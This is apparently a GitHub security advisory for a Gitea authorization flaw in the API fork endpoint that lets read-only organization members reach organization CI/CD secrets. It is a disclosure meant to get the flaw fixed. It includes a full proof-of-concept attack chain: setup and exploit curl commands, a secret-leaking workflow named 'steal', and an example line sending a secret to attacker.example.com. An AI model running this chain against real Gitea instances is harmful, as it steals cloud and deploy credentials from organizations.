# [H] Gitea: API Fork Missing CanCreateOrgRepo Check Allows Org Secret Exfiltration

## Summary
Severity: High
Advisory: GHSA-fhx7-m96w-mv29
CVE: CVE-2026-22555
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-fhx7-m96w-mv29
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.26.0

## Details
## Summary

The API endpoint `POST /api/v1/repos/{owner}/{repo}/forks` only checks `IsOrgMember()` when a user forks a repository into an organization, but does not check `CanCreateOrgRepo()`. The web UI fork handler correctly checks both. This allows a read-only organization member — in a team with `can_create_org_repo=false` — to create repositories in the organization namespace via the API. The attacker receives full admin permissions on the forked repository, can enable Actions, push arbitrary workflow files, and exfiltrate all organization-level CI/CD secrets (deploy keys, cloud credentials, API tokens) through the runner infrastructure.

## Steps To Reproduce

### 1. Environment setup

Start a Gitea instance with Actions enabled:

```bash
# docker-compose.yml
cat > docker-compose.yml << 'EOF'
version: '3'
services:
  gitea:
    image: gitea/gitea:1.23
    container_name: gitea-poc
    ports:
      - "3000:3000"
    volumes:
      - gitea-data:/data
    environment:
      - GITEA__database__DB_TYPE=sqlite3
      - GITEA__server__ROOT_URL=http://localhost:3000/
      - GITEA__security__INSTALL_LOCK=true
      - GITEA__actions__ENABLED=true
volumes:
  gitea-data:
EOF

docker compose up -d
# Wait for startup
sleep 15

# Create admin user
docker exec -u git gitea-poc gitea admin user create \
  --admin --username admin --password 'Admin1234!' \
  --email admin@example.com --must-change-password=false
```

### 2. Create the target environment (as admin)

```bash
# Get admin token
ADMIN_TOKEN=$(curl -s -X POST "http://localhost:3000/api/v1/users/admin/tokens" \
  -u "admin:Admin1234!" -H "Content-Type: application/json" \
  -d '{"name": "setup", "scopes": ["all"]}' | python3 -c "import sys,json; print(json.load(sys.stdin)['sha1'])")

# Create attacker user
curl -s -X POST "http://localhost:3000/api/v1/admin/users" \
  -H "Authorization: token $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attacker123!","email":"attacker@example.com","must_change_password":false}'

# Create organization
curl -s -X POST "http://localhost:3000/api/v1/orgs" \
  -H "Authorization: token $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"username":"target-org","visibility":"public"}'

# Create a source repository in the org
curl -s -X POST "http://localhost:3000/api/v1/orgs/target-org/repos" \
  -H "Authorization: token $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"source-repo","auto_init":true}'

# Create a read-only team with can_create_org_repo=false
TEAM_ID=$(curl -s -X POST "http://localhost:3000/api/v1/orgs/target-org/teams" \
  -H "Authorization: token $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"readonly-team","permission":"read","can_create_org_repo":false,"units":["repo.code","repo.issues"]}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# Add attacker to the read-only team
curl -s -X PUT "http://localhost:3000/api/v1/teams/$TEAM_ID/members/attacker" \
  -H "Authorization: token $ADMIN_TOKEN"

# Add source-repo to the team so attacker can read it
curl -s -X PUT "http://localhost:3000/api/v1/teams/$TEAM_ID/repos/target-org/source-repo" \
  -H "Authorization: token $ADMIN_TOKEN"

# Create organization secrets (simulating real CI/CD credentials)
curl -s -X PUT "http://localhost:3000/api/v1/orgs/target-org/actions/secrets/DEPLOY_KEY" \
  -H "Authorization: token $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"data":"sk-live-test-deploy-key-1234567890abcd"}'

curl -s -X PUT "http://localhost:3000/api/v1/orgs/target-org/actions/secrets/AWS_ACCESS_KEY" \
  -H "Authorization: token $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"data":"AKIAIOSFODNN7EXAMPLE"}'

curl -s -X PUT "http://localhost:3000/api/v1/orgs/target-org/actions/secrets/AWS_SECRET_KEY" \
  -H "Authorization: token $ADMIN_TOKEN" -H "Content-Type: application/json" \
  -d '{"data":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}'
```

### 3. Register an Actions runner

```bash
# Get runner registration token
REG_TOKEN=$(docker exec -u git gitea-poc gitea actions generate-runner-token)

# Start act_runner (adjust network name if needed)
NETWORK=$(docker inspect gitea-poc --format '{{range $key, $val := .NetworkSettings.Networks}}{{$key}}{{end}}')
docker run -d --name act-runner --network "$NETWORK" \
  -e GITEA_INSTANCE_URL=http://gitea-poc:3000 \
  -e GITEA_RUNNER_REGISTRATION_TOKEN="$REG_TOKEN" \
  -e GITEA_RUNNER_LABELS=ubuntu-latest:docker://node:20-bookworm \
  -v /var/run/docker.sock:/var/run/docker.sock \
  gitea/act_runner:latest

# Wait for runner registration
sleep 15
```

### 4. Verify attacker CANNOT create repos in the org (expected: 403)

```bash
# Get attacker token
ATTACKER_TOKEN=$(curl -s -X POST "http://localhost:3000/api/v1/users/attacker/tokens" \
  -u "attacker:Attacker123!" -H "Content-Type: application/json" \
  -d '{"name": "poc", "scopes": ["all"]}' | python3 -c "import sys,json; print(json.load(sys.stdin)['sha1'])")

# Try creating a repo directly — should fail
curl -s -o /dev/null -w "Direct repo creation: HTTP %{http_code}\n" \
  -X POST "http://localhost:3000/api/v1/orgs/target-org/repos" \
  -H "Authorization: token $ATTACKER_TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"should-fail","auto_init":true}'
# Expected output: Direct repo creation: HTTP 403

# Verify attacker cannot access org secrets via API
curl -s -o /dev/null -w "Access org secrets: HTTP %{http_code}\n" \
  "http://localhost:3000/api/v1/orgs/target-org/actions/secrets" \
  -H "Authorization: token $ATTACKER_TOKEN"
# Expected output: Access org secrets: HTTP 403
```

### 5. Exploit: Fork into the org via API (THE BYPASS)

```bash
# Fork the source repo into the org — this should also fail but doesn't
FORK_RESULT=$(curl -s -X POST \
  "http://localhost:3000/api/v1/repos/target-org/source-repo/forks" \
  -H "Authorization: token $ATTACKER_TOKEN" -H "Content-Type: application/json" \
  -d '{"organization":"target-org","name":"evil-fork"}')

echo "$FORK_RESULT" | python3 -c "
import sys,json
d = json.load(sys.stdin)
print(f'Fork created: {d[\"full_name\"]}')
print(f'Permissions: admin={d[\"permissions\"][\"admin\"]}, push={d[\"permissions\"][\"push\"]}')
"
# Expected output:
#   Fork created: target-org/evil-fork
#   Permissions: admin=True, push=True
```

The attacker now has admin+push access to an org-owned repository, despite being in a team with `can_create_org_repo=false`.

### 6. Enable Actions and push exfiltration workflow

```bash
# Enable Actions on the fork
curl -s -X PATCH "http://localhost:3000/api/v1/repos/target-org/evil-fork" \
  -H "Authorization: token $ATTACKER_TOKEN" -H "Content-Type: application/json" \
  -d '{"has_actions":true}'

# Push a workflow that references org secrets
WORKFLOW=$(cat << 'WFEOF'
name: exfiltrate
on: [push]
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - name: Leak org secrets
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
          AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
          AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}
        run: |
          echo "=== SECRET EXFILTRATION ==="
          echo "DEPLOY_KEY length: ${#DEPLOY_KEY}"
          echo "AWS_ACCESS_KEY length: ${#AWS_ACCESS_KEY}"
          echo "AWS_SECRET_KEY length: ${#AWS_SECRET_KEY}"
          echo "DEPLOY_KEY prefix: ${DEPLOY_KEY:0:4}..."
          echo "AWS_ACCESS_KEY prefix: ${AWS_ACCESS_KEY:0:4}..."
          echo "AWS_SECRET_KEY prefix: ${AWS_SECRET_KEY:0:4}..."
          echo "=== END EXFILTRATION ==="
WFEOF
)

curl -s -X POST \
  "http://localhost:3000/api/v1/repos/target-org/evil-fork/contents/.gitea/workflows/steal.yml" \
  -H "Authorization: token $ATTACKER_TOKEN" -H "Content-Type: application/json" \
  -d "{\"content\":\"$(echo -n "$WORKFLOW" | base64 -w0)\",\"message\":\"add CI\"}"
```

### 7. Verify secret exfiltration

```bash
# Wait for the runner to execute the workflow (60-120 seconds)
sleep 90

# Check the Actions run page in browser or via API:
echo "View results at: http://localhost:3000/target-org/evil-fork/actions"
```

Expected output in the workflow logs:
```
=== SECRET EXFILTRATION ===
DEPLOY_KEY length: 37
AWS_ACCESS_KEY length: 20
AWS_SECRET_KEY length: 40
DEPLOY_KEY prefix: sk-l...
AWS_ACCESS_KEY prefix: AKIA...
AWS_SECRET_KEY prefix: wJal...
=== END EXFILTRATION ===
```

All three organization-level secrets are accessible to the attacker's workflow. In a real attack, the workflow would exfiltrate secrets to an attacker-controlled endpoint (e.g., `curl -d "$SECRET" https://attacker.example.com/collect`).

## Impact

A read-only organization member — with no repository creation rights (`can_create_org_repo=false`) — can exfiltrate all organization-level CI/CD secrets by exploiting a missing authorization check in the API fork endpoint. The web UI correctly enforces the `CanCreateOrgRepo` permission, but the API does not, creating a classic API-vs-web authorization inconsistency.

The attack chain is: (1) fork an existing org repo back into the same org via the API, bypassing the `CanCreateOrgRepo` check; (2) receive admin permissions on the fork as its creator; (3) enable Actions and push a workflow that references org secrets; (4) the org's runner picks up the job (runners match on `repository.owner_id`), and org secrets are injected into the workflow environment (fetched by `Repo.OwnerID`); (5) the workflow exfiltrates all org secrets.

Organization secrets commonly include deploy keys, cloud credentials (AWS IAM keys, GCP service accounts), container registry tokens, and personal access tokens with broad scope. Stolen credentials enable lateral movement to cloud infrastructure, private repositories, and external services far beyond the Gitea instance itself. The attacker can also push arbitrary code under the organization's trusted namespace, creating supply chain risk for downstream consumers.

This is particularly dangerous because organizations commonly use read-only teams for auditors, reviewers, contractors, or new employees — precisely the users who should NOT have access to production secrets.


## Supporting Material/References

  * **poc-fork-authz-bypass.zip** — ZIP archive containing the full exploit script and README
  * Vulnerable code — API fork handler (missing `CanCreateOrgRepo` check):
    https://github.com/go-gitea/gitea/blob/79f96b3e24/routers/api/v1/repo/fork.go#L135-L144
  * Correct code — Web fork handler (has `CanCreateOrgRepo` check):
    https://github.com/go-gitea/gitea/blob/79f96b3e24/routers/web/repo/fork.go#L181-L189
  * Runner task assignment (matches on `owner_id`):
    https://github.com/go-gitea/gitea/blob/79f96b3e24/models/actions/task.go#L245-L248
  * Secret injection (fetches by `Repo.OwnerID`):
    https://github.com/go-gitea/gitea/blob/79f96b3e24/models/secret/secret.go#L167
  * Fork creator gets admin permissions:
    https://github.com/go-gitea/gitea/blob/79f96b3e24/services/repository/create.go#L433-L440
  * Related fix: PR #34031 fixed a similar bypass via repo transfers, confirming this class of authorization inconsistency is treated as a vulnerability
  * OWASP API Security Top 10 2023: API5 — Broken Function Level Authorization
  * OWASP Top 10 2021: A01 — Broken Access Control


[poc-fork-authz-bypass.zip](https://github.com/user-attachments/files/26129318/poc-fork-authz-bypass.zip)

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-fhx7-m96w-mv29
- https://github.com/go-gitea/gitea
